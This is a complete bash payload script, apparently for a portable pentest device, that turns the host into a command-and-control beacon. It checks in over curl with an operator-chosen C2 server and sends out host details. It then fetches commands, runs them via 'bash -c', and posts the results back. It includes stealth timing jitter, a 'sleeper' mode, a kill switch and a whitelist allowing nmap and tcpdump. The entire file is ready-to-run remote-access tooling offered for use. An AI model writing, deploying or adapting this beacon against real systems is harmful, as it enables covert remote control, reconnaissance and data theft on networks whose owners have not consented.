#!/bin/bash
# Title: C2 Beacon
# Author: NullSec
# Description: Command & control beacon with periodic check-in and remote execution
# Category: nullsec/remote

LOOT_DIR="/mmc/nullsec/c2beacon"
mkdir -p "$LOOT_DIR"

PROMPT "C2 BEACON

Establishes a command &
control beacon that checks
in with a remote server
periodically.

Features:
- HTTP/HTTPS check-in
- Pull & execute commands
- Return results to C2
- Configurable intervals
- Stealth timing jitter
- Kill switch support

Press OK to configure."

# Check connectivity
if ! ping -c 1 -W 3 8.8.8.8 >/dev/null 2>&1; then
    ERROR_DIALOG "No internet connection!

C2 beacon requires an
active WAN uplink."
    exit 1
fi

if ! command -v curl >/dev/null 2>&1; then
    ERROR_DIALOG "curl not found!

opkg update && opkg install
curl"; exit 1
fi

C2_URL=$(TEXT_PICKER "C2 server URL:" "https://c2.example.com/beacon")
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) C2_URL="" ;; esac
[ -z "$C2_URL" ] && { ERROR_DIALOG "C2 URL required!"; exit 1; }
[ "$C2_URL" = "https://c2.example.com/beacon" ] && { ERROR_DIALOG "Configure a real C2 URL!"; exit 1; }

AUTH_TOKEN=$(TEXT_PICKER "Auth token:" "")
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) AUTH_TOKEN="" ;; esac

PROMPT "CHECK-IN INTERVAL:

1. Aggressive (30s)
2. Normal (5 min)
3. Low & slow (15 min)
4. Sleeper (1 hour)
5. Custom interval

Select mode next."

INTERVAL_MODE=$(NUMBER_PICKER "Interval (1-5):" 2)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) INTERVAL_MODE=2 ;; esac

case $INTERVAL_MODE in
    1) INTERVAL=30 ;;
    2) INTERVAL=300 ;;
    3) INTERVAL=900 ;;
    4) INTERVAL=3600 ;;
    5) INTERVAL=$(NUMBER_PICKER "Seconds:" 300)
       case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) INTERVAL=300 ;; esac ;;
    *) INTERVAL=300 ;;
esac

[ "$INTERVAL" -lt 10 ] && INTERVAL=10
[ "$INTERVAL" -gt 86400 ] && INTERVAL=86400

JITTER=$(NUMBER_PICKER "Jitter % (0-50):" 20)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) JITTER=20 ;; esac
[ "$JITTER" -lt 0 ] && JITTER=0
[ "$JITTER" -gt 50 ] && JITTER=50

PROMPT "EXECUTION LIMITS:

1. All commands (full)
2. Info gathering only
3. Network commands only
4. Custom whitelist

Select trust level next."

TRUST_LEVEL=$(NUMBER_PICKER "Trust (1-4):" 2)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) TRUST_LEVEL=2 ;; esac

MAX_RUNTIME=$(NUMBER_PICKER "Max runtime (hours):" 24)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) MAX_RUNTIME=24 ;; esac
[ "$MAX_RUNTIME" -lt 1 ] && MAX_RUNTIME=1
[ "$MAX_RUNTIME" -gt 720 ] && MAX_RUNTIME=720

# Generate beacon ID
BEACON_ID=$(cat /sys/class/net/eth0/address 2>/dev/null | md5sum | cut -c1-12)
[ -z "$BEACON_ID" ] && BEACON_ID=$(head -c 6 /dev/urandom | xxd -p)

resp=$(CONFIRMATION_DIALOG "START BEACON?

C2: ${C2_URL:0:30}...
Beacon ID: $BEACON_ID
Interval: ${INTERVAL}s
Jitter: ${JITTER}%
Trust: Level $TRUST_LEVEL
Max runtime: ${MAX_RUNTIME}h

Press OK to activate.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

TIMESTAMP=$(date +%Y%m%d_%H%M%S)
BEACON_LOG="$LOOT_DIR/beacon_$TIMESTAMP.log"
RESULT_DIR="$LOOT_DIR/results"
PID_FILE="$LOOT_DIR/beacon.pid"
mkdir -p "$RESULT_DIR"

# Kill existing beacon
if [ -f "$PID_FILE" ]; then
    OLD_PID=$(cat "$PID_FILE")
    kill "$OLD_PID" 2>/dev/null
    rm -f "$PID_FILE"
fi

# Command validation based on trust level
validate_command() {
    local cmd="$1"
    case $TRUST_LEVEL in
        1) return 0 ;;
        2) echo "$cmd" | grep -qiE '^(cat |ls |ip |ifconfig|arp|netstat|uname|uptime|whoami|id|df|free|ps|iw |iwinfo|hostapd)' && return 0 ;;
        3) echo "$cmd" | grep -qiE '^(ip |ifconfig|arp|netstat|ping|traceroute|nmap|tcpdump|iw |iwinfo|iwlist)' && return 0 ;;
        4) # Custom whitelist from file
           WHITELIST_FILE="$LOOT_DIR/whitelist.txt"
           [ -f "$WHITELIST_FILE" ] && grep -qF "$(echo "$cmd" | awk '{print $1}')" "$WHITELIST_FILE" && return 0 ;;
    esac
    return 1
}

LOG "C2 beacon activated: $BEACON_ID"
SPINNER_START "Beacon activating..."

# Launch beacon loop in background
(
    START_TIME=$(date +%s)
    MAX_SECONDS=$((MAX_RUNTIME * 3600))
    CHECKIN_COUNT=0

    while true; do
        # Check max runtime
        ELAPSED=$(( $(date +%s) - START_TIME ))
        [ "$ELAPSED" -ge "$MAX_SECONDS" ] && { echo "[$(date)] Max runtime reached" >> "$BEACON_LOG"; break; }

        # Check-in with C2
        CHECKIN_COUNT=$((CHECKIN_COUNT + 1))
        SYSINFO=$(uname -a 2>/dev/null)
        UPTIME=$(uptime 2>/dev/null)
        CLIENTS=$(cat /tmp/dhcp.leases 2>/dev/null | wc -l | tr -d ' ')

        RESPONSE=$(curl -s -m 15 \
            -H "X-Beacon-ID: $BEACON_ID" \
            -H "X-Auth-Token: $AUTH_TOKEN" \
            -H "Content-Type: application/json" \
            -d "{\"id\":\"$BEACON_ID\",\"checkin\":$CHECKIN_COUNT,\"uptime\":\"$UPTIME\",\"clients\":$CLIENTS,\"elapsed\":$ELAPSED}" \
            "$C2_URL" 2>/dev/null)

        echo "[$(date)] Check-in #$CHECKIN_COUNT response: ${RESPONSE:0:100}" >> "$BEACON_LOG"

        # Parse command from response (expects JSON: {"cmd":"command","id":"task_id"})
        CMD=$(echo "$RESPONSE" | grep -oP '"cmd"\s*:\s*"\K[^"]+' 2>/dev/null)
        TASK_ID=$(echo "$RESPONSE" | grep -oP '"id"\s*:\s*"\K[^"]+' 2>/dev/null)

        # Check for kill switch
        if echo "$RESPONSE" | grep -q '"kill"'; then
            echo "[$(date)] Kill switch received" >> "$BEACON_LOG"
            break
        fi

        if [ -n "$CMD" ]; then
            echo "[$(date)] Task $TASK_ID: $CMD" >> "$BEACON_LOG"

            if validate_command "$CMD"; then
                # Execute with timeout
                RESULT=$(timeout 30 bash -c "$CMD" 2>&1)
                RESULT_FILE="$RESULT_DIR/task_${TASK_ID}_$(date +%s).txt"
                echo "$RESULT" > "$RESULT_FILE"

                # Return results
                curl -s -m 15 \
                    -H "X-Beacon-ID: $BEACON_ID" \
                    -H "X-Auth-Token: $AUTH_TOKEN" \
                    -H "Content-Type: application/json" \
                    -d "{\"id\":\"$TASK_ID\",\"result\":$(echo "$RESULT" | head -c 4096 | python3 -c 'import sys,json;print(json.dumps(sys.stdin.read()))' 2>/dev/null || echo '\"output too large\"')}" \
                    "${C2_URL}/result" >/dev/null 2>&1

                echo "[$(date)] Task $TASK_ID completed" >> "$BEACON_LOG"
            else
                echo "[$(date)] Task $TASK_ID BLOCKED by trust level" >> "$BEACON_LOG"
            fi
        fi

        # Sleep with jitter
        if [ "$JITTER" -gt 0 ]; then
            JITTER_AMT=$(( INTERVAL * JITTER / 100 ))
            ACTUAL_DELAY=$(( INTERVAL + (RANDOM % (JITTER_AMT * 2 + 1)) - JITTER_AMT ))
            [ "$ACTUAL_DELAY" -lt 5 ] && ACTUAL_DELAY=5
        else
            ACTUAL_DELAY=$INTERVAL
        fi
        sleep "$ACTUAL_DELAY"
    done

    rm -f "$PID_FILE"
) &
BEACON_PID=$!
echo "$BEACON_PID" > "$PID_FILE"

sleep 3
SPINNER_STOP

if kill -0 "$BEACON_PID" 2>/dev/null; then
    LOG "Beacon active (PID: $BEACON_PID)"
    PROMPT "BEACON ACTIVE

Beacon ID: $BEACON_ID
PID: $BEACON_PID
Interval: ${INTERVAL}s ±${JITTER}%
Trust: Level $TRUST_LEVEL
Max runtime: ${MAX_RUNTIME}h

Log: $BEACON_LOG

Runs in background.
To stop: kill $BEACON_PID"
else
    ERROR_DIALOG "BEACON FAILED

Check C2 URL and network.
Log: $BEACON_LOG"
    rm -f "$PID_FILE"
fi
